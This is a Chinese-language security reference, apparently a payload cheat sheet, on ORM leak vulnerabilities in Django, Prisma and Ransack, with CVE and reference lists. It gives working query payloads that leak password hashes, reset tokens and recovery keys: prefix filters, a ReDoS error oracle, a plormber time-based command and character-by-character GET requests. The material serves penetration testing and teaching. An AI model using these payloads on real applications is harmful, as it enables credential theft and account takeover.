# ORM 泄露

> 当由于不当处理 ORM 查询而导致敏感信息（如数据库结构或用户数据）被无意中暴露时，就会发生 ORM 泄露漏洞。这可能发生在应用程序返回原始错误消息、调试信息，或者允许攻击者以揭示底层数据的方式操纵查询的情况下。

## 概要

* [Django (Python)](#django-python)
    * [查询过滤器](#查询过滤器)
    * [关系过滤](#关系过滤)
        * [一对一](#一对一)
        * [多对多](#多对多)
    * [基于错误的泄露 - ReDOS](#基于错误的泄露---ReDOS)
* [Prisma (Node.JS)](#prisma-nodejs)
    * [关系过滤](#关系过滤-1)
        * [一对一](#一对一-1)
        * [多对多](#多对多-1)
* [Ransack (Ruby)](#ransack-ruby)
* [CVE](#cve)
* [参考](#参考)

## Django (Python)

以下代码是 ORM 查询数据库的一个基本示例。

```py
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

问题在于 Django ORM 使用关键字参数语法来构建 QuerySets 的方式。通过使用解包操作符（`**`），用户可以动态控制传递给 filter 方法的关键字参数，从而根据需要筛选结果。

### 查询过滤器

攻击者可以控制用于过滤结果的列。
ORM 提供了匹配值部分的操作符。这些操作符可以在生成的查询中利用 SQL LIKE 条件，基于用户控制的模式执行正则表达式匹配，或者应用比较操作符如 `<` 和 `>`。

```json
{
    "username": "admin",
    "password__startswith": "p"
}
```

有趣的过滤选项：

* `__startswith`
* `__contains`
* `__regex`

### 关系过滤

让我们使用来自 [Alex Brown 的《PLORMBING YOUR DJANGO ORM》](https://www.elttam.com/blog/plormbing-your-django-orm/) 的这个很棒的例子！
![UML-example-app-simplified-highlight](https://www.elttam.com/assets/images/blog/2024-06-24-plormbing-your-django-orm/UML-example-app-simplified-highlight1.png)

我们可以看到两种类型的关系：

* 一对一关系
* 多对多关系

#### 一对一

通过创建文章的用户过滤，并且密码包含字符 `p`。

```json
{
    "created_by__user__password__contains": "p"
}
```

#### 多对多

几乎相同，但需要过滤更多内容。

* 获取用户 ID：`created_by__departments__employees__user__id`
* 对每个 ID，获取用户名：`created_by__departments__employees__user__username`
* 最后，泄露他们的密码哈希：`created_by__departments__employees__user__password`

在同一请求中使用多个过滤器：

```json
{
    "created_by__departments__employees__user__username__startswith": "p",
    "created_by__departments__employees__user__id": 1
}
```

### 基于错误的泄露 - ReDOS

如果 Django 使用 MySQL，则还可以滥用 ReDOS，在过滤条件不匹配时强制产生错误。

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => 返回某些内容

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => 错误 500 (正则表达式匹配超时)
```

## Prisma (Node.JS)

**工具**：

* [elttam/plormber](https://github.com/elttam/plormber) - 用于利用 ORM 泄露时间型漏洞的工具

    ```ps1
    plormber prisma-contains \
        --chars '0123456789abcdef' \
        --base-query-json '{"query": {PAYLOAD}}' \
        --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
        --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
        --verbose-stats \
        https://some.vuln.app/articles/time-based;
    ```

**示例**：

Node.js 中 Prisma 的 ORM 泄露示例。

```js
const posts = await prisma.article.findMany({
    where: req.query.filter as any // 易受 ORM 泄露影响
})
```

使用 include 返回所有字段的用户记录

```json
{
    "filter": {
        "include": {
            "createdBy": true
        }
    }
}
```

仅选择一个字段

```json
{
    "filter": {
        "select": {
            "createdBy": {
                "select": {
                    "password": true
                }
            }
        }
    }
}
```

### 关系过滤

#### 一对一

* [`filter[createdBy][resetToken][startsWith]=06`](http://127.0.0.1:9900/articles?filter[createdBy][resetToken][startsWith]=)

#### 多对多

```json
{
    "query": {
        "createdBy": {
            "departments": {
                "some": {
                    "employees": {
                        "some": {
                            "departments": {
                                "some": {
                                    "employees": {
                                        "some": {
                                            "departments": {
                                                "some": {
                                                    "employees": {
                                                        "some": {
                                                            "{fieldToLeak}": {
                                                                "startsWith": "{testStartsWith}"
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

## Ransack (Ruby)

仅适用于 Ransack < `4.0.0`。

![ransack_bruteforce_overview](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)

* 提取用户的 `reset_password_token` 字段

    ```ps1
    GET /posts?q[user_reset_password_token_start]=0 -> 空结果页面
    GET /posts?q[user_reset_password_token_start]=1 -> 空结果页面
    GET /posts?q[user_reset_password_token_start]=2 -> 结果页面

    GET /posts?q[user_reset_password_token_start]=2c -> 空结果页面
    GET /posts?q[user_reset_password_token_start]=2f -> 结果页面
    ```

* 针对特定用户并提取其 `recoveries_key`

    ```ps1
    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
    ```

## CVE

* [CVE-2023-47117: Label Studio ORM 泄露](https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw)
* [CVE-2023-31133: Ghost CMS ORM 泄露](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)
* [CVE-2023-30843: Payload CMS ORM 泄露](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)

## 参考

* [ORM 注入 - HackTricks - 2024年7月30日](https://book.hacktricks.xyz/pentesting-web/orm-injection)
* [利用 SQLite 进行 ORM 泄露 - Louis Nyffenegger - 2024年7月30日](https://pentesterlab.com/blog/orm-leak-with-sqlite3)
* [PLORMbing 你的 Django ORM - Alex Brown - 2024年6月24日](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [利用时间型攻击 PLORMbing 你的 Prisma ORM - Alex Brown - 2024年7月9日](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [QuerySet API 参考 - Django - 2024年8月8日](https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
* [Ransack 密码重置令牌 - Lukas Euler - 2023年1月26日](https://positive.security/blog/ransack-data-exfiltration)